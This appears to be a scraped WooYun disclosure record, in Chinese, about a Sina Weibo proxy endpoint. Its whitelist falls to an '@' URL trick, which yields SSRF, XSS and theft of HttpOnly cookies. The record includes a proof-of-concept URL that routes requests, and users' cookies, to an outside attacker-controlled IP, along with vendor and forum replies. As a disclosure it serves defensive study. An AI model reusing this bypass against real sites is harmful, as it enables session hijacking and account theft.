{"id": 73043, "wybug_id": "wooyun-2015-0160643", "wybug_title": "微博上你点我的链接我就可xss你并可拿到httponly的cookie及其他危害", "wybug_corp": "新浪微博", "wybug_author": "呆子不开口", "wybug_date": "2015-12-12 08:56", "wybug_open_date": "2016-01-25 18:01", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-14：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向公众公开  简要描述： 微博上你点我的链接，我就可xss你，并可拿到httponly的cookie，以及些其他方面的危害 详细说明：  见如下请求，实现了一个代理访问url的功能http://weibo.com/p/aj/proxy?api=http%3A%2F%2Fcontentrecommend.mobile.sina.cn这个请求做了些url白名单的校验但有如下问题：一、存在绕过漏洞，导致ssrf漏洞，可以访问内网这个代理功能存在url绕过漏洞，api参数使用下面格式的值可以绕过http://contentrecommend.mobile.sina.cn@123.57.73.3/wb.php攻击poc见：http://weibo.com/p/aj/proxy?api=http%3A%2F%2Fcontentrecommend.mobile.sina.cn%40123.57.73.3%2Fwb.php服务端程序会去请求http://123.57.73.3/wb.php这样就可以ssrf访问内网了二、xss如果我们代理访问的是我们控制的页面，我们的页面可以输出一个存储xss了三、httponly cookie程序在代理访问我们的页面时，会把当前用户的cookie也带给我们。我的服务端php程序，通过$_SERVER['HTTP_COOKIE']就可以取到   漏洞证明：  \n\n   修复方案：  做好白名单校验   版权声明：转载请注明来源 呆子不开口@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-14 13:03 厂商回复： 感谢关注新浪安全，安全问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-12 09:00 |    \t\tking7 \t\t\t( 普通白帽子  |\t\t\t        Rank:1554 漏洞数:226        | Python真是美妙~~)\t\t \n  我表哥又来了    \n     2015-12-12 09:11 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  @king7 你表哥真多、、    \n     2015-12-12 09:15 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:376 漏洞数:83        | 一个逗逼运维)\t\t \n  我就是不点 看你怎么X我    \n     2015-12-12 09:20 |    \t\t1937nick \t\t\t( 普通白帽子  |\t\t\t        Rank:123 漏洞数:40        | 水能载舟,亦能煮粥。物尽其用,人尽其能。)\t\t \n  危害等级：中漏洞Rank：8确认时间：2015-11-25 16:46    \n     2015-12-12 09:54 |    \t\t八戒 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | ~~鬼畜之王~~)\t\t \n  @大师兄啥时候带我飞     \n     2015-12-12 09:55 |    \t\timp0rt \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:51        | 剑影。。。)\t\t \n  @大师兄啥时候带我飞     \n     2015-12-12 09:55 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:316 漏洞数:81        | 呵呵！)\t\t \n  吊    \n     2015-12-12 10:33 |    \t\t火风暴 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:5        | 黑夜给了我无情的眼睛让我拿着冷血的剑,策...)\t\t \n  6666    \n     2015-12-12 11:09 |    \t\t齐迹 \t\t\t( 普通白帽子  |\t\t\t        Rank:784 漏洞数:100        | 重庆地区招聘安全工程师。sec.zbj.com欢迎...)\t\t \n  蠕一把！    \n     2015-12-12 11:12 |    \t\tonpu \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:37        | 勿忘初心)\t\t \n  表哥来了    \n     2015-12-12 11:22 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:190 漏洞数:67        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  又扶了扶眼镜。    \n     2015-12-12 12:16 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:524 漏洞数:117        | http://www.wooyun.org/flea/165  还有一个...)\t\t \n  我的老表终于出场了    \n     2015-12-12 12:29 |    \t\tk0_pwn \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:11        | 专注且自由)\t\t \n  伟哥又要发威了！    \n     2015-12-12 13:06 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:77        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  伟哥高考语文是省状元吧    \n     2015-12-12 13:46 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Up)\t\t \n  吃惊    \n     2015-12-12 16:19 |    \t\t5t4rk \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:1        | 不积跬步无以至千里,不积小流无以成江海)\t\t \n  牛逼,膜拜    \n     2015-12-12 18:11 |    \t\tbit4 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 终于，我也是有ID的人了！)\t\t \n  http://drops.wooyun.org/papers/501    \n     2015-12-12 18:34 |    \t\t神话般的孩纸 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:9        | 非技术人员，信息安全爱好者)\t\t \n  妈妈问我为什么跪在电脑前。。。    \n     2015-12-12 22:08 |    \t\t呆子不开口 \t\t\t( 普通白帽子  |\t\t\t        Rank:370 漏洞数:34        | 求各种兼职)\t\t \n  @bit4 不是    \n     2015-12-12 22:23 |    \t\t盛大在线(乌云厂商)\t\t \n  @bit4  你太小看人家了    \n     2015-12-12 22:37 |    \t\t小思 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 乌云杰出青年 | null)\t\t \n  @盛大在线 呦    \n     2015-12-14 08:54 |    \t\tbit4 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 终于，我也是有ID的人了！)\t\t \n  @盛大在线 是我太菜逼...    \n     2015-12-14 08:55 |    \t\tbit4 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 终于，我也是有ID的人了！)\t\t \n  @呆子不开口 好吧，等着公开了，膜拜大神。    \n     2015-12-15 15:52 |    \t\t佳佳佳佳佳  \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:5        | I want to be ur sunshine.)\t\t \n  我还以为是bug了  原来是个新洞~偶像好厉害！    \n     2016-01-08 20:52 |    \t\t齐迹 \t\t\t( 普通白帽子  |\t\t\t        Rank:784 漏洞数:100        | 重庆地区招聘安全工程师。sec.zbj.com欢迎...)\t\t \n  居然会带上cookie去访问。。。这个有点意思    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}